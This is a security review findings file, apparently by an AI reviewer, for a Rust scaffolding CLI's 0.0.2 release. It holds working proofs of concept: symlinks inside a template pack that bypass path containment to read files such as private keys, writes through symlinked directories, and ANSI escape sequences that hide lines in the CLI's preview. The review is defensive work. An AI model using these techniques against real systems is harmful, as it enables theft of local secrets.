# `ship-v0-0-2-inc1` round 1: reviewer, adversarial-construction lens

## Artifact reviewed

`git diff main..HEAD` at `f86e529` in the detached worktree `.claude/worktrees/rev-attack`, five commits:

- `5bad30b` fix: refuse a pack dest that leaves the output directory
- `703a2e3` fix: keep every interpolated free-text value on one generated line
- `10694e1` chore: release 0.0.2
- `d8aa12a` fix: refuse a pack asset source that leaves the pack directory
- `f86e529` fix: contain every pack-controlled path at the shared read site

Specification: `docs/plans/agent-scaffold.steps/ship-v0-0-2.md` (`F1`, `F4`, `F4b` and the release half).

## Method

The lens is adversarial construction, not prose. Every claim below was built and run. No repository file was modified except this findings file.

Two release binaries, one CARGO_TARGET_DIR each, verified distinct so no stale-fingerprint reuse could make the two revisions look alike:

```
md5sum target-head/release/agent-scaffold target-main/release/agent-scaffold
e35232edde3e7c5c8cd91c80dfb53bbb  .../target-head/release/agent-scaffold
4b7f9d3a23902eef0967ac162e3bd371  .../target-main/release/agent-scaffold
```

`target-head` is the worktree at `f86e529`; `target-main` is a `git archive main | tar x` extract in its own tree with its own target directory.

Attack fixtures live under `/tmp/claude-1000/.../scratchpad/rev-attack/`. Paths are shortened to `$SB` below. `$BIN` is the HEAD binary, `$MAIN` the `main` binary. Markdown-table rendering questions were settled against `cmark-gfm 0.29.0.gfm.13` (the GitHub reference implementation), not by reading the spec.

Gates run at HEAD, all green: `cargo test` (exit 0), `cargo clippy --all-targets -- -D warnings` (exit 0), `cargo publish --dry-run` (packaged 392 files, 5.9MiB, verify compiled, "aborting upload due to dry run"), `render --check --strict docs/plans/agent-scaffold.plan.toml` ("up to date"), `validate --source ... --metrics ...` (99 steps, 75 questions, valid; 328 metrics records, valid), `validate --plan docs/plans/agent-scaffold.md --metrics docs/metrics/workflow.jsonl` (exactly one problem, the pre-existing `Q-43` `superseded by` one the spec excludes).

PROVENANCE OF THIS FILE. The original was destroyed by the coordinator before it was harvested, and this is a rewrite from the review transcript. Every command and every measured output below is transcribed from the runs recorded there; the scratchpad fixtures and both binaries survived and were confirmed unchanged by md5sum before writing. Two things were re-run rather than transcribed, and only two: the `A1` headline reproduction, which reproduces identically (recorded again in place), and the `fs::canonicalize` grep cited at the end of `A1`, which was measured for this rewrite rather than during the review. Nothing else was re-run and nothing is reconstructed from memory. There are no gaps I had to mark, because the transcript carries the exact output of every run below.

## Verdict table

| id | severity | one line |
| --- | --- | --- |
| `A1` | high | A symlink inside the pack defeats `F4b` at both callers: an outside file is still copied into the scaffolded project at exit 0, and one `link -> /` restores full arbitrary-path read. |
| `A2` | low | A pack `dest` still writes outside `--output-dir` through a symlinked directory that already exists in the output tree, while the run reports "Wrote to `<output-dir>`". |
| `A3` | low | `dest = ""`, `"."`, `"./"` and `"sub/"` pass the new load-time predicate and fail (or silently no-op) at the write instead, so the refuse-at-the-boundary property is partial. |
| `A4` | low | The `dest` refusal message asserts something untrue of the input it refuses: `a/../b.md` does not leave the output directory, and the message says it does. |
| `A5` | low | Confirms the implementer's self-report: an escaping `source` on a disabled module is not refused, while an escaping `dest` on the same asset is. The comment that justifies the `dest` behaviour argues against the `source` behaviour. |

No `critical` finding. `A1` is the only finding above `low`.

## `A1` (high): the containment predicate is lexical, so a symlink inside the pack still reads outside it

`safe_path::is_contained_relative` (`src/safe_path.rs:29`) is a check on the STRING. `PackSource::read` (`src/manifest.rs:430-435`) applies it and then calls `fs::read_to_string(root.join(rel))`, which follows symlinks. A pack that ships a symlink therefore passes the check and reads outside the pack anyway. The defect `F4b` names, "a pack `source` can read outside the pack directory", is not closed; only two of its three carriers are.

Both callers the spec's `F4b` criterion 3 enumerates are affected.

### `[[asset]].source` through a symlink

```
mkdir -p $SB/a1/pack $SB/a1/out
printf 'TOP SECRET KEY\n' > $SB/a1/secret.md
ln -sf ../secret.md $SB/a1/pack/link.md
printf '[[asset]]\nsource = "link.md"\ndest = "leaked.md"\nownership = "working"\n' > $SB/a1/pack/pack.toml
$BIN scaffold --template $SB/a1/pack --output-dir $SB/a1/out --vcs none --dry-run
$BIN scaffold --template $SB/a1/pack --output-dir $SB/a1/out --vcs none --write
cat $SB/a1/out/leaked.md
```

Measured at `f86e529`:

```
          create  leaked.md
Dry run; nothing written. Pass --write to apply.
exit=0
          create  leaked.md
Wrote to .../a1/out (1 changed, 0 left untouched).
exit=0
TOP SECRET KEY
```

This is byte-for-byte the outcome the spec records for `F4b` at `d06f1b5`: exit 0, an ordinary `create leaked.md` plan line, the outside file's contents in the scaffolded project, and nothing in the report naming the file that was read.

The `--write` half of this reproduction was re-run when this file was rewritten and produced the same three lines, against the same binary (md5 `e35232edde3e7c5c8cd91c80dfb53bbb`).

### `[[module]].guidance` through a symlink, and an absolute target

```
printf 'SECRET GUIDANCE\n' > $SB/a1b/outside-guidance.md
printf 'ABSOLUTE OUTSIDE FILE\n' > $SB/a1b/outside-abs.md
ln -sf $SB/a1b/outside-guidance.md $SB/a1b/pack/g.md
ln -sf $SB/a1b/outside-abs.md      $SB/a1b/pack/abs.md
# pack.toml: [[module]] name="m" description="d" guidance="g.md";
#            [[asset]] source="abs.md" dest="host.md" render=true;
#            [[asset]] source="body.md" dest="body.md" render=true   (body.md is "MODULES BLOCK:\n{{modules}}")
$BIN scaffold --template $SB/a1b/pack --output-dir $SB/a1b/out --vcs none --module m --write
```

Measured:

```
          create  host.md
          create  body.md
Wrote to .../a1b/out (2 changed, 0 left untouched).
exit=0
--- host.md:
ABSOLUTE OUTSIDE FILE
--- body.md:
MODULES BLOCK:
SECRET GUIDANCE
```

The guidance shape is the worse of the two, exactly as the CHANGELOG says of the `..` form: no plan line names the file at all, because guidance renders into another asset's body.

### One symlink restores the whole capability

The `..` and absolute refusals are both bypassed by a single directory symlink, after which any absolute path on the machine is readable:

```
ln -sfn / $SB/a13/pack/root
printf 'PRIVATE KEY MATERIAL\n' > $SB/a13/home/id_rsa
printf '[[asset]]\nsource = "root'"$SB"'/a13/home/id_rsa"\ndest = ".agents/notes.md"\nownership = "working"\n' > $SB/a13/pack/pack.toml
$BIN scaffold --template $SB/a13/pack --output-dir $SB/a13/out --vcs none --write
cat $SB/a13/out/.agents/notes.md
```

Measured:

```
          create  .agents/notes.md
Wrote to .../a13/out (1 changed, 0 left untouched).
exit=0
PRIVATE KEY MATERIAL
```

### The delivery vector is real

`git` stores and restores symlinks, so a `--template` pack "the user may have fetched from anywhere" carries the payload intact:

```
git -C $SB/a14/origin init -q && git -C $SB/a14/origin add -A && git -C $SB/a14/origin commit -qm p
git clone -q $SB/a14/origin $SB/a14/clone
ls -l $SB/a14/clone/pack/
lrwxrwxrwx 1 jessea users 15 Aug 13 16:56 link.md -> ../../secret.md
$BIN scaffold --template $SB/a14/clone/pack --output-dir $SB/a14/out --vcs none --write
          create  leaked.md
Wrote to .../a14/out (1 changed, 0 left untouched).
cat $SB/a14/out/leaked.md
SECRET
```

### Why this is `high` and not a wishlist item

Three claims shipped with this change are false as stated, and one of them ships to crates.io in the 0.0.2 CHANGELOG:

- `CHANGELOG.md`, the 0.0.2 Fixed entry: "A pack path can no longer read outside the pack directory (`src/manifest.rs`)." It can.
- `src/manifest.rs:44-49` on `AssetSpec.source`: "so the within-the-pack claim holds rather than being merely documented". It does not hold.
- `src/manifest.rs:96-100` on `ModuleSpec.guidance`: "A FILENAME IN THE PACK is enforced, not merely stated ... so a guidance partial cannot splice a file from outside the pack." It can.

`PackSource::read`'s own doc calls itself "THE ONE containment boundary for pack-controlled paths". That is the shape Principle 5 exists to prevent: a declared-illegal state that nothing makes illegal. The tool is the admit-then-guard case its own principle names, except that the guard here is lexical only.

This project already solved the same problem the other way, one release ago, and said so. `README.md:242` and the 0.0.1 CHANGELOG describe the metrics/ledger containment rule as "resolving both through their real on-disk locations so a symlink cannot disguise one as the other", and that rule deliberately accepts breaking a symlinked `docs/plans` layout because "a loud refusal beats silently reading the wrong file". The code backs the prose: `grep -rn canonicalize src/` at `f86e529` returns seven hits in `src/main.rs`, of which four are live call sites (`:1379`, `:1475`, `:1924`, `:1949`), one is a doc comment describing the rule (`:1571`) and two are in tests (`:3009`, `:3034`). So the resolved-path check is an established technique in this codebase, not a new dependency. The new pack boundary is held to a weaker standard than the boundary the same repository already ships, with no recorded reason for the difference.

A fix is an `fs::canonicalize` of the pack root and of the joined path, then a `starts_with` on the result, with the lexical check kept in front of it as the cheap fail-fast (the lexical one still has to stay: it is what lets `validate --source` and a dry run refuse without touching the filesystem, per `src/safe_path.rs:25-28`). That is a design decision with a cost (a canonicalize per read, and behaviour on a legitimate symlinked pack to settle), so it is the human's call whether it lands in this step or in a follow-up. What is not open is the wording: if the fix is deferred, the CHANGELOG entry and the two doc comments must stop asserting a property the code does not have, since 0.0.2 is a published artifact.

## `A2` (low): a pack `dest` still writes outside `--output-dir` through a symlinked directory

The write-side twin of `A1`, same root cause. `is_contained_relative(&spec.dest)` (`src/manifest.rs:638`) is lexical, and `apply_asset` (`src/main.rs:119-127`) does `root.join(&asset.dest)` and `create_dir_all` + `fs::write`, both of which follow a symlinked path component.

```
mkdir -p $SB/a5/pack $SB/a5/out $SB/a5/elsewhere
ln -sfn $SB/a5/elsewhere $SB/a5/out/docs
printf 'PAYLOAD\n' > $SB/a5/pack/x.md
printf '[[asset]]\nsource = "x.md"\ndest = "docs/dropped.md"\nownership = "working"\n' > $SB/a5/pack/pack.toml
$BIN scaffold --template $SB/a5/pack --output-dir $SB/a5/out --vcs none --write
ls -l $SB/a5/elsewhere
```

Measured:

```
          create  docs/dropped.md
Wrote to .../a5/out (1 changed, 0 left untouched).
exit=0
total 4
-rw-r--r-- 1 jessea users 8 Aug 13 16:53 dropped.md
```

The file lands outside `--output-dir` while the run reports writing inside it, which is the `F4` failure mode in its least visible form (Principle 3, safe on existing projects).

Rated `low` rather than `high` because the symlink has to already exist in the user's own output tree: unlike `A1`, the pack cannot supply it, since assets are regular files and the pack never creates a link. A project with a symlinked `docs/` or `.agents/` is a normal layout, so the case is reachable, but the pack chooses only which existing link to write through.

## `A3` (low): degenerate `dest` values pass the load-time boundary and fail at the write

`is_contained_relative("")` is true (`Path::new("")` has no components, so the `all` over an empty iterator holds) and `"."` is accepted by design. Neither is a destination, so the "refuse at the load boundary, before any write" property the fix installs (`src/manifest.rs:625-632`) does not cover them.

```
for d in '' '.' './' 'sub/'; do
  printf '[[asset]]\nsource = "ok.md"\ndest = "%s"\nownership = "working"\n' "$d" > $SB/a4/pack/pack.toml
  $BIN scaffold --template $SB/a4/pack --output-dir $SB/a4/out --vcs none --write
done
```

Measured:

```
--- dest=[]
   skip (exists)  
Wrote to .../a4/out (0 changed, 1 left untouched).       exit=0
--- dest=[.]
   skip (exists)  .
Wrote to .../a4/out (0 changed, 1 left untouched).       exit=0
--- dest=[./]
   skip (exists)  ./
Wrote to .../a4/out (0 changed, 1 left untouched).       exit=0
--- dest=[sub/]
          create  sub/
Error: Os { code: 21, kind: IsADirectory, message: "Is a directory" }   exit=1
```

Two separate problems. The first three print a plan line with a blank or `.` destination and report the OUTPUT DIRECTORY ITSELF as an existing asset left untouched, at exit 0. The fourth reaches `fs::write` and surfaces a `Debug`-formatted `io::Error` struct, which is not the message style any other refusal in this change uses. Nothing is written outside the output directory in any of the four, which is why this is `low`.

## `A4` (low): the `dest` refusal message states something untrue of the input

```
printf '[[asset]]\nsource = "x.md"\ndest = "a/../b.md"\nownership = "working"\n' > $SB/a12/pack/pack.toml
$MAIN scaffold --template $SB/a12/pack --output-dir $SB/a12/out --vcs none --dry-run
$BIN  scaffold --template $SB/a12/pack --output-dir $SB/a12/out --vcs none --dry-run
```

Measured:

```
          create  a/../b.md
Dry run; nothing written. Pass --write to apply.        main exit=0
error: asset `x.md` has dest `a/../b.md`, which leaves the output directory; a dest \
  must be a relative path with no `..` component        head exit=2
```

The refusal is correct and deliberate: `src/safe_path.rs:56-59` records the reasoning (a symlinked `a` makes the textual cancellation a lie) and pins it in a test. The message is not. `a/../b.md` does not leave the output directory, and the first clause of `LoadError::UnsafeAssetDest` (`src/manifest.rs:271-278`) says it does; the reader is told a falsehood about their input and then, in the second clause, the actual rule. The three sibling messages have the same shape (`UnsafeAssetSource` at `:256-262`, `UnsafeModuleGuidance` at `:263-270`, and `ReadError::Escapes` at `:379-383`, all "leaves the ... directory"). Stating the rule alone, or naming the offending component, would be true of every input each of them refuses.

This also records a behaviour change for the triager: a pack whose `dest` carries a cancelling `..` worked at `main` and is refused at `f86e529`. That trade is the right one, and the spec's `F4` criterion 4 ("a normal scaffold run drops the same set of files it dropped before") is unaffected, verified in the failed-attacks section below.

## `A5` (low): the source check and the dest check disagree about disabled modules

Confirms the consequence the implementer reported, and adds the code's own argument against it.

```
# pack.toml: [[module]] name="m" description="d";
#            [[asset]] source="../secret.md" dest="leaked.md" module="m";
#            [[asset]] source="ok.md" dest="ok.md"
$BIN scaffold --template $SB/a2/pack --output-dir $SB/a2/out --vcs none --write        # module off
$BIN scaffold --template $SB/a2/pack --output-dir $SB/a2/out --vcs none --module m --write
```

Measured:

```
--- module OFF:
          create  ok.md
Wrote to .../a2/out (1 changed, 0 left untouched).      exit=0
--- module ON:
error: asset source `../secret.md` leaves the pack directory; a source must be a \
  relative path with no `..` component                  exit=2
```

The mirror case is refused either way:

```
# [[asset]] source="ok.md" dest="../../escaped.md" module="m", module OFF:
error: asset `ok.md` has dest `../../escaped.md`, which leaves the output directory; \
  a dest must be a relative path with no `..` component  exit=2
```

No leak occurs in the disabled case, because nothing is read, so the CHANGELOG's "can no longer read outside the pack directory" is not falsified by this one. What is inconsistent is which pack-authoring errors a pack author learns about. `src/manifest.rs:630-632` justifies the `dest` behaviour as "Checked for every declared entry regardless of selection ... since an escaping dest is a pack-authoring error whether or not its module is on". That sentence is equally true of `source`, and the comment two lines below (`:634-637`) declines to apply it, on the ground that a second check "could drift from the one that actually guards the read". Both halves are reasonable on their own; together they leave one class of pack-authoring error reported eagerly and its twin reported only on the run that happens to enable the module. Whichever way it is settled, one of the two comments needs to stop making an argument the code does not follow.

## Attacks that FAILED

Recorded so the triager knows what ground is covered. Each was built and run.

`F1`, the projection:

- A `[[question]].ask` whose second line is shaped like a queue item (the spec's own reproduction). `validate --source` accepts, the rendered queue carries exactly `Q-1`, and the ask's second line is folded onto the same line rather than dropped. No fabricated item.
- The same injection through `[meta].title` (a fake `## Roadmap` heading plus a fake table) and through `principle.text` (a fake queue item). Both collapse onto their one generated line; the rendered document keeps exactly one `# ` heading, one `## Roadmap`, one table of three pipe lines, and one `- \`Q-` item. The title case renders as the single line ``# T ## Roadmap  | Step | Status | Notes | | --- | --- | --- | | `ghost` | complete | x | plan``.
- Exotic line separators in an `ask`: U+2028, U+2029, U+0085 (NEL) and form feed all survive into the generated line, and none of them fabricates anything, because neither `str::lines()` (which every `plan.rs` parser uses) nor CommonMark treats them as line endings. A raw U+000B is rejected earlier by the TOML parser ("invalid basic string").
- Defeating the table `|` escape with backslashes. `escape_cell` turns `|` into `\|`, so a note already containing `\|` renders as `\\|`, which CommonMark would read as an escaped backslash followed by a live delimiter. The rendered row was confirmed to carry that sequence:

  ```
  | `alpha` | complete | waived: increment `alpha-inc1` accepted-at-escalation (record-backed)
    - Accepted \\| below its streak at a human escalation.; why: ... |
  ```

  Measured against `cmark-gfm -e table`, the attack fails: `a\\|b`, `a\\\|b`, `a\\\\|b`, `trailing\` and `trailing\\` each produce exactly three `<td>` cells (15 `<td>` for a five-row table), the first three rendering as `a|b`, `a\|b`, `a\|b`. The escape holds; the only effect is that a literal `\|` in a note displays as `|`.
- The fifth-site hunt: every remaining free-text interpolation into a generated line is validated elsewhere, so none of them is a hole. `question.receipt` must be a `Q-<n>` id (`receipt = "Q-1) fabricated"` is refused: "question `Q-1` has a receipt pointer `Q-1) fabricated` that is not a `Q-<n>` id"), `folded_into` must resolve to a real step slug and `superseded_by` to a real question, `blocked_by` and the waiver `increment` are kebab tokens, and the waiver `note` and the provenance `findings` refs both pass through `escape_cell` (a findings ref carrying a newline and a fake table row renders as ``why: findings a \| `ghost` \| complete \| x \| b.md`` on the one Notes cell).
- An empty and a whitespace-only `ask`. Both render as one queue line with one trailing space, no CommonMark hard break, which is what the `one_line` docstring claims.
- Rendering a source `validate --source` rejects. For a step slug of `alpha | complete | injected`, `render` and `render --check --strict` both refuse (exit 1, "step slug ... is not a well-formed kebab-case id") rather than emitting a corrupt projection, so the free-text-controls-structure class cannot be reached through an invalid source either.
- `render --check --strict docs/plans/agent-scaffold.plan.toml` reports "up to date" at `f86e529`, and `validate --plan docs/plans/agent-scaffold.md --metrics docs/metrics/workflow.jsonl` reports exactly one problem, "Open Questions item `Q-43` has an unknown status `superseded by `Q-44``", the one the spec excludes. `F1` criteria 3 and 4 hold.

`F4` / `F4b`, containment:

- Both spec shapes on both fields, at `--dry-run` and at `--write`: `source = "../secret.md"`, an absolute `source`, `dest = "../../escaped.md"` and an absolute `dest` are each refused at exit 2, the message names the offending value, and nothing is created anywhere (verified with `ls -la` on the parent of the output directory, which holds only the pre-existing `pack/`, `out/` and `secret.md`).
- The read really does not happen. Under `nix shell nixpkgs#strace --command strace -f -e trace=openat,open -o trace.txt`, a run refused for `source = "../secret.md"` produced a trace with `grep -c "secret.md"` equal to `0`. `F4b` criterion 2 holds for the `..` shape.
- An escaping `[[module]].guidance` on an enabled module is refused with its own message naming the module ("module `m` guidance file `../secret.md` leaves the pack directory; a guidance path must be a relative path with no `..` component"), so the two callers do not report as each other. With the module off, the guidance is not read and the run proceeds, which is correct: an unenabled module contributes nothing.
- Windows-style separators. `dest = "..\\escape.md"` and `dest = "C:\\escape.md"` are accepted on Linux and create files with those literal names INSIDE the output directory (`find` shows `out/..\escape.md` and `out/C:\escape.md`, and the parent directory is untouched); nothing escapes. The check is `std::path`-based, so a Windows build parses `\` as a separator and refuses the same strings there. No cross-platform hole, only an ugly filename.
- False refusals on a legitimate pack. A normal `scaffold` run is byte-identical between `main` and `f86e529`: `diff -r` over the `--module checks` output trees and over the `--instrument` output trees both report no differences ("TREES IDENTICAL", "TREES IDENTICAL 2"), and the two runs' stdout is identical after normalising the output path ("LOGS IDENTICAL"). `F4` and `F4b` criterion 4 holds. `./nested/file.md` style refs are still accepted.
- The built-in pack asset list is untouched by the diff (`git diff main..HEAD -- src/manifest.rs` shows the last non-test hunk starting at old line 529; the list at old `:611` sits inside no hunk).

## Out-of-scope observations

Not findings against this change. Recorded because they were built during the attack and are adjacent to the boundary this change now owns.

### A pack-controlled `dest` carrying ANSI escapes rewrites the plan preview

Pre-existing: `main` behaves identically (measured, same two plan lines), so this is not a regression, and the spec does not name it. It is adjacent because `dest` is now a validated field and the change's own comment argues that the preview must never promise a write the action refuses.

```
# pack.toml, second asset:  dest = "\u001B[1A\u001B[2Khidden.md"
$BIN scaffold --template $SB/a8/pack --output-dir $SB/a8/out --vcs none --write | cat -v
          create  visible.md
          create  ^[[1A^[[2Khidden.md
Wrote to .../a8/out (2 changed, 0 left untouched).
ls -b $SB/a8/out
\033[1A\033[2Khidden.md
visible.md
```

Piped through `cat -v` the escapes are visible. On a terminal, `ESC[1A ESC[2K` moves the cursor up one line and erases it, so a pack can make the preview erase the line naming a file it drops. `ls -b` confirms both files were created. A raw control character in the TOML is rejected by the parser ("invalid basic string"), so the payload has to be written as a `\u001B` escape, which TOML accepts.

### The plan-side sidecar boundary has the same symlink hole

Same predicate, other caller, and pre-existing on `main` (measured: both binaries splice the outside file). A `[meta].sidecars` front ref that names a symlink inside the plan directory splices the outside file into `<task>.md`:

```
ln -sf $SB/a7/outside.md $SB/a7/plan/front.md      # front = ["front.md"]
$BIN validate --source $SB/a7/plan/p.plan.toml --metrics /dev/null   # 1 steps, 1 questions, valid; exit 0
$BIN render $SB/a7/plan/p.plan.toml                                  # rendered ...; exit 0
grep -n "OUTSIDE THE PLAN DIRECTORY" $SB/a7/plan/p.md
7:OUTSIDE THE PLAN DIRECTORY
```

It matters to `A1` only as evidence about the fix's shape: `src/safe_path.rs:1-11` now presents one predicate as covering both boundaries, so whatever resolution `A1` gets applies here too. The input here is the user's own `.plan.toml` in their own repository, which is a weaker threat model than a fetched pack, so it does not carry `A1`'s severity on its own.
